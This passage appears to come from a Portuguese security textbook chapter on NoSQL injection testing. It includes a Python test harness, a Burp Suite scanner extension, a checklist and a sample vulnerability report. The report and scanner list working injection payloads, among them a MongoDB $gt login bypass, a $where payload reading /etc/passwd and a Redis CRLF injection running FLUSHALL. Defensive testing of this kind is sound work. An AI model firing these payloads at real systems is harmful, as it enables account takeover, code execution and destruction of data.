                    'status': 'PASS' if self._check_expected(response, test['expected']) else 'FAIL',
                    'response_code': response.status_code,
                    'details': response.text[:200]
                }
                
                self.results.append(result)
                
            except requests.RequestException as e:
                self.results.append({
                    'test': test['name'],
                    'status': 'ERROR',
                    'details': str(e)
                })
        
        return self.results
    
    def test_data_extraction(self):
        """Testa extração de dados"""
        test_cases = [
            {
                'name': 'Regex password extraction',
                'payload': {"username": "admin", "password": {"$regex": "^a"}},
                'indicator': 'password'
            },
            {
                'name': 'Union-like data extraction',
                'payload': {"search": "' UNION SELECT * FROM users--"},
                'indicator': 'user'
            },
            {
                'name': 'JSON path traversal',
                'payload': {"path": "$[*]"},
                'indicator': 'all_data'
            }
        ]
        
        for test in test_cases:
            try:
                response = requests.post(
                    f"{self.base_url}/api/search",
                    json=test['payload']
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if self._contains_sensitive_data(data):
                        self.results.append({
                            'test': test['name'],
                            'status': 'FAIL',
                            'severity': 'CRITICAL',
                            'details': 'Sensitive data exposed'
                        })
                    else:
                        self.results.append({
                            'test': test['name'],
                            'status': 'PASS'
                        })
                
            except requests.RequestException as e:
                self.results.append({
                    'test': test['name'],
                    'status': 'ERROR',
                    'details': str(e)
                })
        
        return self.results
    
    def _check_expected(self, response, expected):
        """Verifica se resposta corresponde ao esperado"""
        if expected == 'success':
            return response.status_code == 200
        elif expected == 'error':
            return response.status_code >= 400
        elif expected == 'blocked':
            return response.status_code in [400, 403, 405]
        return True
    
    def _contains_sensitive_data(self, data):
        """Verifica se dados sensíveis estão expostos"""
        sensitive_patterns = ['password', 'secret', 'token', 'key', 'credential']
        
        def check_dict(d, path=""):
            for key, value in d.items():
                current_path = f"{path}.{key}" if path else key
                
                for pattern in sensitive_patterns:
                    if pattern in key.lower():
                        return True
                
                if isinstance(value, dict):
                    if check_dict(value, current_path):
                        return True
        
        return check_dict(data)
```

### Ferramentas de Teste

**Burp Suite Extension para NoSQL:**

```python
# Burp Suite extension para NoSQL injection testing
from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue

class NoSQLInjectionScanner(IBurpExtender, IScannerCheck):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.registerScannerCheck(self)
    
    def doPassiveScan(self, baseRequestResponse):
        # Análise passiva
        return None
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Teste ativo para NoSQL injection"""
        
        # Payloads para teste
        payloads = [
            '{"$gt": ""}',
            '{"$ne": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '"; return true; //',
        ]
        
        issues = []
        
        for payload in payloads:
            # Construir requisição de teste
            request = insertionPoint.buildRequest(
                self._helpers.stringToBytes(payload)
            )
            
            # Enviar requisição
            response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                request
            )
            
            # Analisar resposta
            if self._is_vulnerable(response):
                issues.append(
                    NoSQLInjectionIssue(
                        baseRequestResponse,
                        response,
                        payload
                    )
                )
        
        return issues
    
    def _is_vulnerable(self, response):
        """Verifica se resposta indica vulnerabilidade"""
        response_info = self._helpers.analyzeResponse(response.getResponse())
        
        # Verificar se resposta indica bypass
        if response_info.getStatusCode() == 200:
            body = self._helpers.bytesToString(response.getResponse())[
                response_info.getBodyOffset():
            ]
            
            # Indicadores de bypass bem-sucedido
            indicators = [
                'success',
                'token',
                'welcome',
                'admin'
            ]
            
            for indicator in indicators:
                if indicator.lower() in body.lower():
                    return True
        
        return False

class NoSQLInjectionIssue(IScanIssue):
    
    def __init__(self, baseRequestResponse, response, payload):
        self._baseRequestResponse = baseRequestResponse
        self._response = response
        self._payload = payload
    
    def getUrl(self):
        return self._baseRequestResponse.getUrl()
    
    def getIssueName(self):
        return "NoSQL Injection"
    
    def getIssueType(self):
        return 0x00100000
    
    def getSeverity(self):
        return "High"
    
    def getConfidence(self):
        return "Certain"
    
    def getIssueBackground(self):
        return "NoSQL injection vulnerability detected"
    
    def getRemediationBackground(self):
        return "Use parameterized queries and input validation"
    
    def getIssueDetail(self):
        return f"Payload: {self._payload}"
    
    def getRemediationDetail(self):
        return None
```

### OWASP Testing Guide para NoSQL Injection

**Checklist de Teste:**

1. **Identificação de vetores de ataque**
   - [ ] Mapear todos os endpoints que aceitam entrada do usuário
   - [ ] Identificar campos que são usados em consultas NoSQL
   - [ ] Verificar se a aplicação usa MongoDB, CouchDB, Redis, etc.
   - [ ] Analisar se operadores de consulta são permitidos na entrada

2. **Teste de Bypass de Autenticação**
   - [ ] Testar com objetos JSON em vez de strings
   - [ ] Testar operadores $gt, $ne, $regex
   - [ ] Testar $where com expressões JavaScript
   - [ ] Verificar se autenticação é bypassada

3. **Teste de Extração de Dados**
   - [ ] Testar regex para extração seletiva
   - [ ] Testar $where para execução de código
   - [ ] Testar operadores de comparação
   - [ ] Verificar se dados sensíveis são expostos

4. **Teste de Command Injection**
   - [ ] Testar interpolação em comandos Redis
   - [ ] Testar EVAL com scripts maliciosos
   - [ ] Testar configuração de Redis
   - [ ] Verificar se RCE é possível

5. **Teste de GraphQL**
   - [ ] Testar introspection
   - [ ] Testar batch queries
   - [ ] Testar fragment abuse
   - [ ] Verificar schema exposure

6. **Teste de JSON Path**
   - [ ] Testar path traversal
   - [ ] Testar filtros maliciosos
   - [ ] Verificar se dados extras são expostos

### Relatório de Testes

```markdown
# Relatório de NoSQL Injection Testing

## Resumo Executivo
- Total de endpoints testados: 25
- Vulnerabilidades encontradas: 8
- Críticas: 2
- Altas: 3
- Médias: 2
- Baixas: 1

## Vulnerabilidades Encontradas

### CRÍTICA: Bypass de Autenticação via MongoDB $gt
- **Endpoint**: POST /api/login
- **Campo**: password
- **Payload**: {"password": {"$gt": ""}}
- **Impacto**: Acesso não autorizado a qualquer conta
- **CVSS**: 9.8
- **Remediação**: Validar tipos de entrada, usar Mongoose com schema validation

### CRÍTICA: RCE via MongoDB $where
- **Endpoint**: POST /api/products/search
- **Campo**: query
- **Payload**: {"query": "' || (function() { cat('/etc/passwd'); })() || '"}
- **Impacto**: Execução remota de código no servidor
- **CVSS**: 10.0
- **Remediação**: Desabilitar $where em produção

### ALTA: Command Injection via Redis
- **Endpoint**: POST /api/cache
- **Campo**: key
- **Payload**: "foo\r\nFLUSHALL"
- **Impacto**: Perda de dados, persistência de webshells
- **CVSS**: 8.5
- **Remediação**: Usar parâmetros Redis, sanitizar entradas

### ALTA: GraphQL Introspection Habilitada
- **Endpoint**: POST /graphql
- **Payload**: { __schema { types { name } } }
- **Impacto**: Exposição completa do schema
- **CVSS**: 7.5
- **Remediação**: Desabilitar introspection em produção

## Recomendações Gerais
1. Implementar validação de entrada em todos os endpoints
2. Usar schemas de validação (Mongoose, Joi, etc.)
3. Desabilitar funcionalidades perigosas em produção
4. Implementar rate limiting
5. Logs de auditoria habilitados
6. Testes de segurança automatizados no CI/CD
```

---

## Referências e Recursos Adicionais

### Documentação Oficial

- **MongoDB Security**: https://docs.mongodb.com/manual/security/
- **CouchDB Security**: https://docs.couchdb.org/en/stable/security.html
- **Redis Security**: https://redis.io/docs/management/security/
- **Elasticsearch Security**: https://www.elastic.co/guide/en/elasticsearch/reference/current/security.html
- **GraphQL Security**: https://graphql.org/learn/security/

### OWASP Resources

- **OWASP NoSQL Injection**: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_NoSQL_Injection
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **OWASP Cheat Sheet Series**: https://cheatsheetseries.owasp.org/

### Books and Papers

- "NoSQL Injection" by OWASP
- "Hacking NoSQL" by Timothy D. Morgan
- "The NoSQL Database Security Guide" by MongoDB
- "Security for NoSQL Databases" by CouchDB

### Tools

- **Burp Suite**: Scanner com plugins para NoSQL
- **SQLMap**: Suporte limitado para NoSQL
- **NoSQLMap**: Ferramenta específica para NoSQL injection
- **Custom Scripts**: Python/Node.js para teste automatizado

---

*Este capítulo demonstrou os principais vetores de NoSQL injection, técnicas de teste e como preveni-los. No próximo capítulo, veremos Stored Procedures e segurança.*
